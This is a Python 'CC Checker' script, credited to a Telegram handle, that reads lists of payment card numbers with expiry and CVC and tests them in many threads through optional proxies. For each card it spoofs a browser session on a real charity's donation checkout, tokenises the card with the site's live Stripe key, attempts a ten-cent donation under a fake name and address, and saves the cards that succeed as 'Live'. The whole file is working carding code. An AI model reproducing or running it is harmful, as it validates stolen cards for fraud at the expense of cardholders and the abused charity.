import requests,random
from queue import Queue
from threading import Thread


logo = """
    ██████╗ ██████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
    ██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██║     ██║         ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
    ██║     ██║         ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ╚██████╗╚██████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
    ╚═════╝ ╚═════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                            By TELE: @H_CZZ , IG: @1ezp                                  
\n\n
"""""
print(logo)


def check(cc):
    number = cc.split("|")[0]
    month = cc.split("|")[1]
    year = cc.split("|")[2]
    cvc = cc.split("|")[3]
    r = requests.Session()
    if withproxy:
        proxy = random.choice(proxies)
        r.proxies = {
            'http':'http://'+proxy,
            'https':'http://'+proxy}
    try:
    
    
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'text/plain;charset=UTF-8',
            'cookie': 'm=e02c87db-6695-48c6-b55b-c3966791beff6c77f3',
            'dnt': '1',
            'origin': 'https://m.stripe.network',
            'pragma': 'no-cache',
            'referer': 'https://m.stripe.network/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        }

        data = 'JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjI4YjY0MmZjOWMwODVlNmNhMDQ3Y2VkNjA3YjkxZWQxNiUyMiUyQyUyMnQlMjIlM0E0NDcuOCUyQyUyMnRhZyUyMiUzQSUyMjQuNS40MiUyMiUyQyUyMnNyYyUyMiUzQSUyMmpzJTIyJTJDJTIyYSUyMiUzQW51bGwlMkMlMjJiJTIyJTNBJTdCJTIyYSUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC54QllMWTRZV1o4dHY5SllTYTk3MTlqS3A1c1lwdTFjSWdxaVFOUlBLSUVRLl9NMEd5d2g0TmdISlRVMUFqUGxnMDRRR2VRblF0b3ZkcTRuUzZCVG9nUXMlMkYxVmJHRS04a243LUxsWWh6NUVDVGp1UC1WaDA2VVZCZHFiZFQ0elh2UVBnJTJGbkNJZ1FwY3hNTG5JR2M3dzQyM25CeEtFX1FBc0NKbHhFRjctdXpEZm05QSUzRkYyclNBZ3lxVVBUdWlBQWgwa0VwNnBQelBENlQzcEJnVGR1dllTZDdTVUUlM0RTazlHYUt4RWZIcnl5N0RUamFvTVRVUEN2SHZXbUtWUmdpS0JQUjUwTUJZJTI2SDhkY1VxQ2M2MWdpaWtES0NqY3BOSXVxR2pLNTFwN3ZqZ3lqTkJaZmwzNCUzRExyUEdMLWhIa0dvdlBzTWZUbElEczdJWHJTUHlLTWNkeFdpRzB0N0dLeXMlMjIlMkMlMjJiJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZYX3ZXT3BZUXcyeWltUHphMmxkaWxzc1oxVmdsQWg2VjNoeGtUVGNrbTE0LnhCWUxZNFlXWjh0djlKWVNhOTcxOWpLcDVzWXB1MWNJZ3FpUU5SUEtJRVEuX00wR3l3aDROZ0hKVFUxQWpQbGcwNFFHZVFuUXRvdmRxNG5TNkJUb2dRcyUyRjFWYkdFLThrbjctTGxZaHo1RUNUanVQLVZoMDZVVkJkcWJkVDR6WHZRUGclMkZaXzM4WmNoekoyX19LZUFtVXlJcktvUEdnQ3I4d1hrRUMyODZKTUp5ZUJrJTIyJTJDJTIyYyUyMiUzQSUyMmVXb3NXY2U4S1hZSGJCcWcxNEl5SUJJUGVsRnVrYkJkempGQ3JvN19lSEElMjIlMkMlMjJkJTIyJTNBJTIyYmY1OWIwZmEtMjZmNy00OTFjLWJhMWQtNzRkZTJlMDVjMDc4MzkyZGQ3JTIyJTJDJTIyZSUyMiUzQSUyMjI5MzExNDIxLTBhZjEtNDc1Ni04ZGQ0LWU2ODMyOWZmM2I4OWZjNDAyMiUyMiUyQyUyMmYlMjIlM0FmYWxzZSUyQyUyMmclMjIlM0F0cnVlJTJDJTIyaCUyMiUzQXRydWUlMkMlMjJpJTIyJTNBJTVCJTIybG9jYXRpb24lMjIlNUQlMkMlMjJqJTIyJTNBJTVCJTVEJTJDJTIybiUyMiUzQTE4NDYuOTAwMDAwMDM1NzYyOCUyQyUyMnUlMjIlM0ElMjJ3d3cuY2ZwLWRjLm9yZyUyMiUyQyUyMnYlMjIlM0ElMjJ3d3cuY2ZwLWRjLm9yZyUyMiU3RCUyQyUyMmglMjIlM0ElMjI2YmQ5ZjU1NDhmMDZlMDZlODI1MyUyMiU3RA=='

        response = r.post('https://m.stripe.com/6', headers=headers, data=data)
        guid = response.cookies.get_dict()['m']
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'text/plain;charset=UTF-8',
            'cookie': f'm={guid}',
            'dnt': '1',
            'origin': 'https://m.stripe.network',
            'pragma': 'no-cache',
            'referer': 'https://m.stripe.network/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        }

        data = 'JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjI4YjY0MmZjOWMwODVlNmNhMDQ3Y2VkNjA3YjkxZWQxNiUyMiUyQyUyMnQlMjIlM0ExMDAuOCUyQyUyMnRhZyUyMiUzQSUyMjQuNS40MiUyMiUyQyUyMnNyYyUyMiUzQSUyMmpzJTIyJTJDJTIyYSUyMiUzQW51bGwlMkMlMjJiJTIyJTNBJTdCJTIyYSUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC54QllMWTRZV1o4dHY5SllTYTk3MTlqS3A1c1lwdTFjSWdxaVFOUlBLSUVRLl9NMEd5d2g0TmdISlRVMUFqUGxnMDRRR2VRblF0b3ZkcTRuUzZCVG9nUXMlMkYxVmJHRS04a243LUxsWWh6NUVDVGp1UC1WaDA2VVZCZHFiZFQ0elh2UVBnJTJGbkNJZ1FwY3hNTG5JR2M3dzQyM25CeEtFX1FBc0NKbHhFRjctdXpEZm05QSUzRkYyclNBZ3lxVVBUdWlBQWgwa0VwNnBQelBENlQzcEJnVGR1dllTZDdTVUUlM0RTazlHYUt4RWZIcnl5N0RUamFvTVRVUEN2SHZXbUtWUmdpS0JQUjUwTUJZJTI2SDhkY1VxQ2M2MWdpaWtES0NqY3BOSXVxR2pLNTFwN3ZqZ3lqTkJaZmwzNCUzRExyUEdMLWhIa0dvdlBzTWZUbElEczdJWHJTUHlLTWNkeFdpRzB0N0dLeXMlMjIlMkMlMjJiJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZYX3ZXT3BZUXcyeWltUHphMmxkaWxzc1oxVmdsQWg2VjNoeGtUVGNrbTE0LnhCWUxZNFlXWjh0djlKWVNhOTcxOWpLcDVzWXB1MWNJZ3FpUU5SUEtJRVEuX00wR3l3aDROZ0hKVFUxQWpQbGcwNFFHZVFuUXRvdmRxNG5TNkJUb2dRcyUyRjFWYkdFLThrbjctTGxZaHo1RUNUanVQLVZoMDZVVkJkcWJkVDR6WHZRUGclMkZaXzM4WmNoekoyX19LZUFtVXlJcktvUEdnQ3I4d1hrRUMyODZKTUp5ZUJrJTIyJTJDJTIyYyUyMiUzQSUyMmVXb3NXY2U4S1hZSGJCcWcxNEl5SUJJUGVsRnVrYkJkempGQ3JvN19lSEElMjIlMkMlMjJkJTIyJTNBJTIyYmY1OWIwZmEtMjZmNy00OTFjLWJhMWQtNzRkZTJlMDVjMDc4MzkyZGQ3JTIyJTJDJTIyZSUyMiUzQSUyMjI5MzExNDIxLTBhZjEtNDc1Ni04ZGQ0LWU2ODMyOWZmM2I4OWZjNDAyMiUyMiUyQyUyMmYlMjIlM0FmYWxzZSUyQyUyMmclMjIlM0F0cnVlJTJDJTIyaCUyMiUzQXRydWUlMkMlMjJpJTIyJTNBJTVCJTIybG9jYXRpb24lMjIlNUQlMkMlMjJqJTIyJTNBJTVCJTVEJTJDJTIybiUyMiUzQTE5OTQuOTAwMDAwMDM1NzYyOCUyQyUyMnUlMjIlM0ElMjJ3d3cuY2ZwLWRjLm9yZyUyMiUyQyUyMnYlMjIlM0ElMjJ3d3cuY2ZwLWRjLm9yZyUyMiU3RCUyQyUyMmglMjIlM0ElMjIwNDBiODNjZDg4ZmI3NGE3M2Y3ZCUyMiU3RA=='

        response = r.post('https://m.stripe.com/6', headers=headers, data=data)
        muid = response.json()['muid']
        guid = response.json()['guid']
        sid = response.json()['sid']


        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Cookie': 'wcsid=FNpqe24EfwO1wcCm6W4TR0MAa60kAorb; hblid=0XBVwvgOQgDGf96A6W4TR0MAbr6Uj6ka; _oklv=1659943692908%2CFNpqe24EfwO1wcCm6W4TR0MAa60kAorb; _ga=GA1.2.2070974844.1659943693; _gid=GA1.2.1337280674.1659943693; _dc_gtm_UA-2058492-2=1; _okdetect=%7B%22token%22%3A%2216599436940640%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D; _fbp=fb.1.1659943694674.1601055812; olfsk=olfsk09922147558339156; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1659943695936%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=6365-899-10-4326',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        }

        response = r.get('https://www.cfp-dc.org/cfpdc/index.php', headers=headers)
        PHPSESSID = response.cookies.get_dict()['PHPSESSID']
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Cookie': f'PHPSESSID={PHPSESSID}; _ga=GA1.2.1994402372.1659941007; _gid=GA1.2.251667233.1659941007; _fbp=fb.1.1659941008775.24640874; _dc_gtm_UA-2058492-2=1',
            'DNT': '1',
            'Origin': 'https://www.cfp-dc.org',
            'Pragma': 'no-cache',
            'Referer': 'https://www.cfp-dc.org/cfpdc/checkout.php?Step=Step34&directcheckout=1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',

        }

        data = [
            ('user_id', '952270'),
            ('amount_subtotal', '0.1'),
            ('amount_giftcard', '0'),
            ('amount_adminfee', '0.00'),
            ('amount_total', '0.10'),
            ('_submit', '1'),
            ('id', '34973'),
            ('_card_type', 'PP'),
            ('name', 'ali'),
            ('address', '1685 Marcus Street'),
            ('zip', '35816'),
            ('city', 'Huntsville'),
            ('state', 'AL'),
            ('email', 'hekmet122@gmail.com'),
            ('giftcard_code', ''),
            ('Step', 'Step34'),
            ('adminfee', '0'),
            ('amount_subtotal', '0.1'),
            ('amount_giftcard', '0'),
            ('amount_adminfee', '0'),
            ('amount_total', '0.10'),
            ('recurring_period', ''),
            ('Step4_cc', '1'),
            ('_submit', '1'),
            ('Step', 'Step34'),
            ('id', '34973'),
        ]

        response = r.post('https://www.cfp-dc.org/cfpdc/checkout.php',  headers=headers, data=data)
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
            'Connection': 'keep-alive',
            'Cookie': f'PHPSESSID={PHPSESSID}; _ga=GA1.2.1994402372.1659941007; _gid=GA1.2.251667233.1659941007; _dc_gtm_UA-2058492-2=1; _fbp=fb.1.1659941008775.24640874',
            'DNT': '1',
            'Origin': 'https://www.cfp-dc.org',
            'Pragma': 'no-cache',
            'Referer': 'https://www.cfp-dc.org/cfpdc/checkout_onestep.php?charity_id=990',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',

        }

        params = {
            'charity_id': '990',
            'f': '',
        }

        data = {
            'charity_id': '990',
            'f': '',
            'wishlist_suggestion': '4',
            'amount': '0.10',
            'designation': '',
            'dedication': '',
            'recurring_period': '',
            'addtocart_directcheckout': 'Add to cart and proceed to checkout',
        }

        response = r.post('https://www.cfp-dc.org/cfpdc/checkout_onestep.php', params=params, headers=headers, data=data)
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
            'Connection': 'keep-alive',
            'Cookie': f'PHPSESSID={PHPSESSID}; _ga=GA1.2.1994402372.1659941007; _gid=GA1.2.251667233.1659941007; _fbp=fb.1.1659941008775.24640874',
            'Pragma': 'no-cache',
            'Referer': 'https://www.cfp-dc.org/cfpdc/checkout.php?Step=Step34&directcheckout=1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',

        }

        params = {
            'Step': 'Step5',
            'method': 'CC',
            'id': '34973',
        }

        response = r.get('https://www.cfp-dc.org/cfpdc/checkout.php', params=params, headers=headers)
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
            'Connection': 'keep-alive',
            'Cookie': f'PHPSESSID={PHPSESSID}; _ga=GA1.2.1994402372.1659941007; _gid=GA1.2.251667233.1659941007; _fbp=fb.1.1659941008775.24640874; __stripe_sid={sid}; __stripe_mid={muid}; _dc_gtm_UA-2058492-2=1',
            'DNT': '1',
            'Referer': 'https://www.cfp-dc.org/cfpdc/checkout.php?Step=Step34&directcheckout=1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',

        }

        response = r.get('https://www.cfp-dc.org/cfpdc/stripe.php', headers=headers)

        
        url = "https://api.stripe.com/v1/tokens"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" ,
            "Content-Type": "application/x-www-form-urlencoded",
            'Pragma': 'no-cache',
            'Accept': '*/*'
        }
        data =  f"time_on_page=38972&pasted_fields=number&guid={guid}&muid={muid}&sid={sid}&key=pk_live_NnwzH3hFYClvgrGubNe7nj51&payment_user_agent=stripe.js%2F78ef418&card[number]={number}&card[cvc]={cvc}&card[exp_month]={month}&card[exp_year]={year}&card[name]=Omar+Ali&card[address_line1]=1685+Marcus+Street&card[address_zip]=35816&card[address_country]=US"
        
        response = r.post(url,headers=headers,data=data)
        if response.text.__contains__('"id"'):
            tok = response.json()['id']
            
            url = "https://www.cfp-dc.org/cfpdc/stripe_process.php"
            
            data = f"stripeToken={tok}"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
                "Pragma": "no-cache" ,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,
                "Accept-Encoding": "gzip, deflate, br" ,
                "Accept-Language": "en,ar;q=0.9,en-US;q=0.8" ,
                "Cache-Control": "max-age=0" ,
                "Connection": "keep-alive" ,
                "Content-Type": "application/x-www-form-urlencoded" ,
                "Cookie": f"PHPSESSID={PHPSESSID}; _ga=GA1.2.1994402372.1659941007; _gid=GA1.2.251667233.1659941007; _fbp=fb.1.1659941008775.24640874; __stripe_sid={sid}; __stripe_mid={muid}",
                "Host": "www.cfp-dc.org" ,
                "Origin": "https://www.cfp-dc.org" ,
                "Referer": "https://www.cfp-dc.org/cfpdc/stripe.php" ,
                "Upgrade-Insecure-Requests": "1" ,
            }
            
            response = r.post(url,headers=headers,data=data)
            if 'donation processed' in response.text or 'Thank You' in response.text or 'thank you' in response.text:
                print(f"Live {cc}")
                with open("Good.txt",'a') as f:
                    f.write(cc+"\n")
            elif 'donation not processed' in response.text:
                print(f"DD {cc}")
            else:
                print(f"UNK {cc}")
                q.put(cc)
        else:
            print(f"DD {cc}")
            q.put(cc)
    except:
        print(f"Error {cc}")
        q.put(cc)






q = Queue()
def start():
    while not q.empty():
        check(str(q.get()))
        
ccs = open("cc.txt",'r').read().splitlines()
for cc in ccs:
    q.put(cc)
withproxy = input("With Proxies y/n: ")
if withproxy == "Y" or withproxy == "y":
    proxies = open("proxies.txt",'r').read().splitlines()
    withproxy = True
else: withproxy = False
thre = int(input("Thread: "))
for i in range(thre):
    Thread(target=start).start()
